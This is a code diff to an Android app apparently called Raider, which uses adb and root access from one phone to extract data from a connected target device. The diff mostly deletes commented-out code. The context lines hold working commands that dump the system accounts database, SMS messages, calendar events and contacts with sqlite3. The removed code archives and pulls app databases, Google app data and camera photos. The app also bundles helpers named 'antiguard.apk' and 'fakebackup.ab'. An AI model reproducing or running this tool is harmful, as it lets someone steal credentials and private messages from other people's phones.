@@ -80,8 +80,7 @@ public class RaiderActivity extends Activity {
 	@Override
 	public void onCreate(Bundle savedInstanceState) {
 		super.onCreate(savedInstanceState);
-		// requestWindowFeature(Window.FEATURE_INDETERMINATE_PROGRESS);
-		// requestWindowFeature(Window.FEATURE_PROGRESS);
+
 		setContentView(R.layout.main);
 		btnStartADB = (Button) findViewById(R.id.button1);
 		btnStartADB.setOnClickListener(btnStartADBpressed);
@@ -165,10 +164,9 @@ public class RaiderActivity extends Activity {
 		btnGetContacts.setTextColor(Color.GRAY);
 		btnGetMapsData.setTextColor(Color.GRAY);
 		btnGetWifi.setTextColor(Color.GRAY);
-		// setProgressBarIndeterminateVisibility(false);
-		// setProgressBarVisibility(false);
+
 		doCheckIfAdbIsAvailable();
-		// doCheckIfSqlite3IsAvailable();
+
 		doExtractFiles("antiguard.apk");
 		doExtractFiles("fakebackup.ab");
 		doExtractFiles("sqlite3");
@@ -720,232 +718,6 @@ public class RaiderActivity extends Activity {
 
 	}
 
-	// public void doGetData() {
-	// String s = null;
-	// String dir = "/sdcard/Android/data";
-	//
-	// if (doCheckDirs(dir)) {
-	//
-	// doCheckIfADBIsRunning();
-	// if (bADBRunning) {
-	//
-	// try {
-	//
-	// /* run the Unix "adb devices" command */
-	// progressDialog = ProgressDialog.show(RaiderActivity.this,
-	// "Raiding data", " Please wait ... ", true);
-	// String outdir = Environment.getExternalStorageDirectory()
-	// .toString();
-	//
-	// doInitializeShellProcess();
-	// StringBuilder sb = new StringBuilder();
-	// DataOutputStream os = new DataOutputStream(
-	// mainprocess.getOutputStream());
-	//
-	// os.writeBytes("adb shell \"tar -cf "
-	// + outdir
-	// +
-	// "/raider-data.tar /sdcard/Android/data/*/shared_prefs /sdcard/Android/data/*/databases\" && cd "
-	// + outdir
-	// + " && adb pull /mnt/sdcard/raider-data.tar\n");
-	//
-	// os.writeBytes("exit\n");
-	// os.flush();
-	//
-	// while ((s = mainstdInput.readLine()) != null) {
-	//
-	// s = s + "\n";
-	// etInput.append(s);
-	// s = "";
-	//
-	// }
-	//
-	// while ((s = mainstdError.readLine()) != null) {
-	// s = s + "\n";
-	// etInput.append(s);
-	// s = "";
-	//
-	// }
-	//
-	// } catch (IOException e) {
-	// progressDialog.dismiss();
-	// etInput.append("exception happened - here's what I know: ");
-	// etInput.append(e.toString());
-	// }
-	// ;
-	// } else {
-	// progressDialog.dismiss();
-	// etInput.append("ADB not running. Please start it first \r\n");
-	// }
-	// progressDialog.dismiss();
-	// } else {
-	// progressDialog.dismiss();
-	// etInput.append("/sdcard/Android/data/ not present \r\n");
-	// }
-	//
-	// }
-
-	// public void doGetDataRoot() {
-	// String s = null;
-	// String dir = "/data/data";
-	//
-	// if (doCheckDirs(dir)) {
-	//
-	// try {
-	//
-	// /* run the Unix "adb devices" command */
-	// progressDialog = ProgressDialog.show(RaiderActivity.this,
-	// "Raiding data as root", " Please wait ... ", true);
-	// String outdir = Environment.getExternalStorageDirectory()
-	// .toString();
-	//
-	// doInitializeShellProcess();
-	// StringBuilder sb = new StringBuilder();
-	// DataOutputStream os = new DataOutputStream(
-	// mainprocess.getOutputStream());
-	// os.writeBytes("adb shell \"tar -cf "
-	// + outdir
-	// +
-	// "/raider-data-root.tar /data/data/*/shared_prefs /data/data/*/databases\" && cd "
-	// + outdir
-	// + " && adb pull /mnt/sdcard/raider-data-root.tar\n");
-	// os.writeBytes("exit\n");
-	// os.flush();
-	//
-	// while ((s = mainstdInput.readLine()) != null) {
-	//
-	// s = s + "\n";
-	// etInput.append(s);
-	// s = "";
-	//
-	// }
-	//
-	// while ((s = mainstdError.readLine()) != null) {
-	// s = s + "\n";
-	// etInput.append(s);
-	// s = "";
-	//
-	// }
-	//
-	// } catch (IOException e) {
-	// progressDialog.dismiss();
-	// etInput.append("exception happened - here's what I know: ");
-	// etInput.append(e.toString());
-	// }
-	// ;
-	// } else {
-	// progressDialog.dismiss();
-	// etInput.append("/data/data/ not present \r\n");
-	// }
-	// progressDialog.dismiss();
-	// }
-
-	// public void doGetGoogleData() {
-	//
-	// String dir = "/data/data";
-	// String s = null;
-	// if (doCheckDirs(dir)) {
-	//
-	// try {
-	// progressDialog = ProgressDialog.show(RaiderActivity.this,
-	// "Raiding google data", " Please wait ... ", true);
-	// etInput.append("Trying to grab data. Please wait patiently...\n");
-	// /* run the Unix "adb devices" command */
-	//
-	// String outdir = Environment.getExternalStorageDirectory()
-	// .toString();
-	//
-	// doInitializeShellProcess();
-	// StringBuilder sb = new StringBuilder();
-	// DataOutputStream os = new DataOutputStream(
-	// mainprocess.getOutputStream());
-	// os.writeBytes("adb shell \"tar -c /data/data/com.google.* >   "
-	// + outdir + "/raider-googledata.tar\" && cd " + outdir
-	// + " && adb pull /mnt/sdcard/raider-googledata.tar\n");
-	// os.writeBytes("exit\n");
-	// os.flush();
-	//
-	// while ((s = mainstdInput.readLine()) != null) {
-	//
-	// s = s + "\n";
-	// etInput.append(s);
-	// s = "";
-	//
-	// }
-	//
-	// while ((s = mainstdError.readLine()) != null) {
-	// s = s + "\n";
-	// etInput.append(s);
-	// s = "";
-	//
-	// }
-	//
-	// } catch (IOException e) {
-	// progressDialog.dismiss();
-	// etInput.append("exception happened - here's what I know: ");
-	// etInput.append(e.toString());
-	// }
-	// ;
-	//
-	// } else {
-	// progressDialog.dismiss();
-	// etInput.append("/data/data/ not present \r\n");
-	// }
-	// progressDialog.dismiss();
-	// }
-
-	// public void doGetPics() {
-	// String s = null;
-	// String dir = "/mnt/sdcard/DCIM/Camera";
-	//
-	// if (doCheckDirs(dir)) {
-	//
-	// try {
-	//
-	// /* run the Unix "adb devices" command */
-	// progressDialog = ProgressDialog.show(RaiderActivity.this,
-	// "Raiding pictures", " Please wait ... ", true);
-	// String outdir = Environment.getExternalStorageDirectory()
-	// .toString();
-	//
-	// doInitializeShellProcess();
-	// StringBuilder sb = new StringBuilder();
-	// DataOutputStream os = new DataOutputStream(
-	// mainprocess.getOutputStream());
-	// os.writeBytes("adb shell \"tar -c /mnt/sdcard/DCIM/Camera >   "
-	// + outdir + "/raider-pics.tar\" && cd " + outdir
-	// + " && adb pull /mnt/sdcard/raider-pics.tar\n");
-	// os.writeBytes("exit\n");
-	// os.flush();
-	//
-	// while ((s = mainstdInput.readLine()) != null) {
-	//
-	// s = s + "\n";
-	// etInput.append(s);
-	// s = "";
-	//
-	// }
-	//
-	// while ((s = mainstdError.readLine()) != null) {
-	// s = s + "\n";
-	// etInput.append(s);
-	// s = "";
-	//
-	// }
-	//
-	// } catch (IOException e) {
-	// progressDialog.dismiss();
-	// etInput.append("exception happened - here's what I know: ");
-	// etInput.append(e.toString());
-	// }
-	// ;
-	// } else {
-	// progressDialog.dismiss();
-	// etInput.append("/mnt/sdcard/DCIM/Camera not present \r\n");
-	// }
-	// progressDialog.dismiss();
-	// }
-
 	public void doGetPackages() {
 
 		String s = null;
@@ -1011,20 +783,14 @@ public class RaiderActivity extends Activity {
 				os.writeBytes("adb -d -s "
 						+ strDevice
 						+ " shell su -c \"sqlite3 /data/system/users/0/accounts.db 'select * from accounts'\"\n");
-				// etInput.append("adb -d -s "
-				// + strDevice
-				// +
-				// " shell su -c \"sqlite3 /data/system/users/0/accounts.db 'select * from accounts'\"\n");
+
 			} else {
 				etInput.append("Trying to read accounts. This may take a while. Please be patient...\r\n");
 
 				os.writeBytes("adb -d -s "
 						+ strDevice
 						+ " shell su -c \"sqlite3 /data/system/accounts.db 'select * from accounts'\"\n");
-				// etInput.append("adb -d -s "
-				// + strDevice
-				// +
-				// " shell su -c \"sqlite3 /data/system/accounts.db 'select * from accounts'\"\n");
+
 			}
 
 			os.writeBytes("exit\n");
@@ -1077,10 +843,7 @@ public class RaiderActivity extends Activity {
 				os.writeBytes("adb -d -s "
 						+ strDevice
 						+ " shell su -c \"sqlite3 /data/data/com.android.providers.telephony/databases/mmssms.db 'select * from sms'\"\n");
-				// etInput.append("adb -d -s "
-				// + strDevice
-				// +
-				// " shell su -c \"sqlite3 /data/system/users/0/accounts.db 'select * from accounts'\"\n");
+
 			} else {
 				etInput.append("Sorry, no SMS DB found. Maybe the target uses a custom SMS app?");
 			}
@@ -1097,7 +860,6 @@ public class RaiderActivity extends Activity {
 					progressDialog.dismiss();
 				}
 				try {
-					// etInput.append(s);
 					String[] strTmp = s.split("\\|");
 
 					for (int i = 0; i < strTmp.length; i++) {
@@ -1146,10 +908,7 @@ public class RaiderActivity extends Activity {
 				os.writeBytes("adb -d -s "
 						+ strDevice
 						+ " shell su -c \"sqlite3 /data/data/com.android.providers.calendar/databases/calendar.db 'select * from Events'\"\n");
-				// etInput.append("adb -d -s "
-				// + strDevice
-				// +
-				// " shell su -c \"sqlite3 /data/system/users/0/accounts.db 'select * from accounts'\"\n");
+
 			} else {
 				etInput.append("Sorry, no calendar events found...");
 			}
@@ -1166,7 +925,6 @@ public class RaiderActivity extends Activity {
 					progressDialog.dismiss();
 				}
 				try {
-					// etInput.append(s);
 					String[] strTmp = s.split("\\|");
 
 					for (int i = 0; i < strTmp.length; i++) {
@@ -1215,10 +973,7 @@ public class RaiderActivity extends Activity {
 				os.writeBytes("adb -d -s "
 						+ strDevice
 						+ " shell su -c \"sqlite3 /data/data/com.android.providers.contacts/databases/contacts2.db 'select * from data'\"\n");
-				// etInput.append("adb -d -s "
-				// + strDevice
-				// +
-				// " shell su -c \"sqlite3 /data/system/users/0/accounts.db 'select * from accounts'\"\n");
+
 			} else {
 				etInput.append("Sorry, no contacts found...");
 			}
@@ -1235,7 +990,6 @@ public class RaiderActivity extends Activity {
 					progressDialog.dismiss();
 				}
 				try {
-					// etInput.append(s);
 					String[] strTmp = s.split("\\|");
 
 					for (int i = 0; i < strTmp.length; i++) {
@@ -1301,7 +1055,6 @@ public class RaiderActivity extends Activity {
 					progressDialog.dismiss();
 				}
 				try {
-					// etInput.append(s);
 					String[] strTmp = s.split("\\|");
 
 					String timeStamp = strTmp[0];
@@ -1371,7 +1124,6 @@ public class RaiderActivity extends Activity {
 					progressDialog.dismiss();
 				}
 				try {
-					// etInput.append(s);
 					String[] strTmp = s.split("\\=");
 
 					if (strTmp[0].contains("ssid")) {
@@ -1704,7 +1456,6 @@ public class RaiderActivity extends Activity {
 	private final View.OnClickListener btnGetDatapressed = new View.OnClickListener() {
 		@Override
 		public void onClick(View v) {
-			// doGetData();
 			etInput.append("Trying to get data from target. Please be patient, this may take a while.");
 			new doGetData().execute();
 		}
@@ -1714,7 +1465,6 @@ public class RaiderActivity extends Activity {
 		@Override
 		public void onClick(View v) {
 			etInput.append("Trying to get data from target. Please be patient, this may take a while.");
-			// doGetDataRoot();
 			new doGetDataRoot().execute();
 		}
 	};
@@ -1723,7 +1473,6 @@ public class RaiderActivity extends Activity {
 		@Override
 		public void onClick(View v) {
 			etInput.append("Trying to get data from target. Please be patient, this may take a while.");
-			// doGetGoogleData();
 			new doGetGoogleData().execute();
 		}
 	};
@@ -1732,7 +1481,6 @@ public class RaiderActivity extends Activity {
 		@Override
 		public void onClick(View v) {
 			etInput.append("Trying to get data from target. Please be patient, this may take a while.");
-			// doGetPics();
 			new doGetPics().execute();
 		}
 	};
@@ -1782,10 +1530,6 @@ public class RaiderActivity extends Activity {
 				etInput.append("\r\n");
 
 				doWaitForDevice();
-				// doGetData();
-				// doGetDataRoot();
-				// doGetGoogleData();
-				// doGetPics();
 
 				new doGetData().execute();
 				new doGetDataRoot().execute();
@@ -1968,7 +1712,7 @@ public class RaiderActivity extends Activity {
 				/* start adb as root */
 
 				doInitializeShellProcess();
-				// StringBuilder sb = new StringBuilder();
+
 				DataOutputStream os = new DataOutputStream(
 						mainprocess.getOutputStream());
 				os.writeBytes("adb kill-server && adb start-server\n");
@@ -1980,16 +1724,12 @@ public class RaiderActivity extends Activity {
 					sb.append(s + "\r\n");
 
 				}
-				// progressDialog.dismiss();
-
-				// read any errors from the attempted command
 
 				while ((s = mainstdError.readLine()) != null) {
 					sb.append(s + "\r\n");
 				}
 
 			} catch (IOException e) {
-				// progressDialog.dismiss();
 				sb.append("exception happened - here's what I know: ");
 
 				sb.append(e.toString());
